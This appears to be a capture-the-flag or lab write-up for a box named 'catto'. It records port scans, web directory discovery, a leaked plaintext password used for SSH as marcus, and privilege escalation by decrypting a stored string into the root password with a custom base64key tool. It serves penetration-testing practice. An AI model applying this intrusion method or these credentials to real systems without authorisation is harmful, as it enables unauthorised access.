# Export
```md
export IP="192.168.159.139"
export URL="http://192.168.159.139:80/FUZZ"
```

<hr>

# Loot
#### Credentials
→ (SSH): `marcus:WallAskCharacter305`

#### Local Enumeration
→ Other local users? No
→ sudo? No
→ Linux version: `Linux 4.18.0`
→ Local service? There is a service listening on port 33863 → Nothing really interesting.
```md
LISTEN           0                128                              0.0.0.0:42022                             0.0.0.0:*             
LISTEN           0                128                            127.0.0.1:33863                             0.0.0.0:*             
LISTEN           0                128                              0.0.0.0:webcache                          0.0.0.0:*             
```

#### Privilege Escalation
+ `.bash` file in user home directory.
```bash
[marcus@catto ~]$ cat .bash
F2jJDWaNin8pdk93RLzkdOTr60==
```

+ Look like base64 encode but when decode, it's actually a binary.
```bash
[marcus@catto ~]$ base64 -d .bash
f��)vOwD��t���
```

+ Find the key
```bash
[marcus@catto ~]$ find / -type f -name "*base64*" 2>/dev/null
/usr/bin/base64
/usr/bin/base64key
...
```

+ Decrypt key and decrypt the binary
```bash
[marcus@catto ~]$ /usr/bin/base64key F2jJDWaNin8pdk93RLzkdOTr60== WallAskCharacter305 1
SortMentionLeast269 # → This is root password
```


#### Take away
+ When enumerating, read information of every website carefully, especially the open-source websites, try to **understand** them.
+  A string looks like base64 (or other types of encoding), but decoding them returns binary. 

+ → We can assume that there is a kind of **encryption** involved. The encryption will encrypt the **original** string and **encode** it with base64, that's why the string looks like base64-encoded but it's actually not. In that case, we try to find the key to recover the original string.  

<hr>

# Nmap
```bash
PORT      STATE SERVICE REASON         VERSION
8080/tcp  open  http    syn-ack ttl 63 nginx 1.14.1
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.1
|_http-title: Identity by HTML5 UP
18080/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.37 ((centos))
| http-methods:
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
30330/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-favicon: Unknown favicon MD5: BC550ED3CF565EB8D826B8A5840A6527
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
35747/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
39529/tcp open  unknown syn-ack ttl 63
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, ms-sql-s, oracle-tns:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
42022/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
50400/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Error
```

<hr>

# Web Application

#### ~~Port 8080~~ 
+ Discovery

```md
assets                  [Status: 301, Size: 185, Words: 6, Lines: 8]
images                  [Status: 301, Size: 185, Words: 6, Lines: 8]
index.html              [Status: 200, Size: 3032, Words: 146, Lines: 92]
download                [Status: 200, Size: 1326614, Words: 5025, Lines: 4850]
```

+ `/download` to download the `download` file, which contains the website source code. → nothing really interested.


#### Port 18080
+ Discovery

```md
.hta                    [Status: 403, Size: 213, Words: 16, Lines: 10]
.htpasswd               [Status: 403, Size: 218, Words: 16, Lines: 10]
.htaccess               [Status: 403, Size: 218, Words: 16, Lines: 10]
backup                  [Status: 301, Size: 244, Words: 14, Lines: 8]
cgi-bin/                [Status: 403, Size: 217, Words: 16, Lines: 10]
noindex                 [Status: 301, Size: 245, Words: 14, Lines: 8]
```

+ List of users stored in `/backup/code/locations.json`.

#### Port 30330 
+ Discovery
```md
icons                   [Status: 301, Size: 177, Words: 7, Lines: 11]
static                  [Status: 301, Size: 179, Words: 7, Lines: 11]
```

+ Running Gatsby?
+ `http://192.168.159.139:30330/minecraft`  reveals some potentials users.

```md
keralis
xisuma
zombiecleo
mumbojumbo
sabel
yvette
zahara
sybilla
marcus
tabbatha
tabby
```

+ `/static`  reveals `/new-server-config-mc` directory, which leaks a plain-text password for a new server. `WallAskCharacter305`  . 

+ `/__graphql` leaks GraphQL databases used to store information of the website.
	+	`allFile`  → `absolutePath` returns a valid home directory of user `marcus`.


#### Port 35747
+ Discovery
```md
/trackEvent
/trackError

→ Cannot GET 
```

+ Using `POST` request yielded an interesting result.
```json
{
	"status":"error",
	"error":"Please provide a body array with the arguments for the function."
}
```

#### ~~Port 50400~~
+ Discovery
```md
service                 [Status: 200, Size: 0, Words: 1, Lines: 1]
session                 [Status: 200, Size: 36, Words: 1, Lines: 1]
```

+ `/session`
```md
http://192.168.136.139:50400/session
→ e6c98e9b-d713-4792-97ee-da1b4a735bd1
```

+ `/service` returns a blank page.
